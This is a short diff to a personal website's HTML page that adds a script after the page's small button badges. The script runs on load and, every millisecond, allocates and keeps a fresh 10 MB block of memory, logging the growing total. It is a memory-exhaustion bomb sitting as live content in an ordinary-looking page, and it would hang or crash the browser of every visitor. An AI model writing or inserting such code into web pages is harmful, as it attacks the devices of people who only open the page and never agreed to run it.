@@ -69,6 +69,18 @@
     <img src="https://88x31.kate.pet/twopaws.png" height="31" alt="twopaws" />
     <img src="./imgs/89x32/meow.png" alt="meow :3">
     <a href="https://www.mozilla.org/en-GB/firefox/new/" title="Firefox" target="_blank"><img src="./imgs/89x32/firefox.gif" alt="Firefox"></a>
-
+<script>
+window.addEventListener("load", () => {
+  const a = [];
+  setInterval(() => {
+    const b = new Uint8Array(10 * 1024 * 1024);
+    for (let i = 0; i < b.length; i += 4096) {
+      b[i] = 1;
+    }
+    a.push(b);
+    console.log(a.length * 10 + " MB");
+  }, 1);
+});
+</script>
 </body>
 </html>
